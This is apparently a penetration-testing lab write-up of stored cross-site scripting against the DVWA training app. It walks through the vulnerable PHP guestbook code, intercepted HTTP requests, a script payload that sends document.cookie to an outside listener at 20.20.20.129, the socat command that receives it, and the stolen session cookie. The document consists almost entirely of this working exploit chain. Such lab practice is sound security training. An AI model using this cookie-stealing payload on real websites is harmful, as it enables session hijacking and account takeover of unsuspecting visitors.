# XSS: security: low
```php
<?php

if(isset($_POST['btnSign']))
{

   $message = trim($_POST['mtxMessage']);
   $name    = trim($_POST['txtName']);
   
   // Sanitize message input
   $message = stripslashes($message);
   $message = mysql_real_escape_string($message);
   
   // Sanitize name input
   $name = mysql_real_escape_string($name);
  
   $query = "INSERT INTO guestbook (comment,name) VALUES ('$message','$name');";
   
   $result = mysql_query($query) or die('<pre>' . mysql_error() . '</pre>' );
   
}

?>
```
## sample request
```
POST /dvwa/vulnerabilities/xss_s/ HTTP/1.1
Host: meta
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 53
Origin: http://meta
Connection: close
Referer: http://meta/dvwa/vulnerabilities/xss_s/
Cookie: security=low; PHPSESSID=ae2efb5757e6d8b6d9c1931b610819e5
Upgrade-Insecure-Requests: 1

txtName=test2&mtxMessage=test2&btnSign=Sign+Guestbook
```
## XSS Request: payload (url-encoded) in the Message parameter:
```html
<script>new Image().src="http://20.20.20.129/cool.jpg?output="+document.cookie;</script>
```
## Note: the comment field had a character limit where we couldn't insert the entire payload. That's why we used `burp` for that
```
POST /dvwa/vulnerabilities/xss_s/ HTTP/1.1
Host: meta
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 147
Origin: http://meta
Connection: close
Referer: http://meta/dvwa/vulnerabilities/xss_s/
Cookie: security=low; PHPSESSID=ae2efb5757e6d8b6d9c1931b610819e5
Upgrade-Insecure-Requests: 1

txtName=test&mtxMessage=<script>new+Image().src%3d"http%3a//20.20.20.129/cool.jpg%3foutput%3d"%2bdocument.cookie%3b</script>&btnSign=Sign+Guestbook
```
## When the page is visited, we get back the cookies on our socat listener:
```bash
socat -d -d TCP4-LISTEN:80,reuseaddr,fork STDOUT
```
```
2022/07/27 14:08:53 socat[213159] N listening on AF=2 0.0.0.0:80
2022/07/27 14:09:00 socat[213159] N accepting connection from AF=2 20.20.20.129:50996 on AF=2 20.20.20.129:80
2022/07/27 14:09:00 socat[213159] N forked off child process 213203
2022/07/27 14:09:00 socat[213159] N listening on AF=2 0.0.0.0:80
2022/07/27 14:09:00 socat[213203] N using stdout for reading and writing
2022/07/27 14:09:00 socat[213203] N starting data transfer loop with FDs [6,6] and [1,1]
GET /cool.jpg?output=security=low;%20PHPSESSID=ae2efb5757e6d8b6d9c1931b610819e5 HTTP/1.1
Host: 20.20.20.129
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: image/webp,*/*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://meta/
```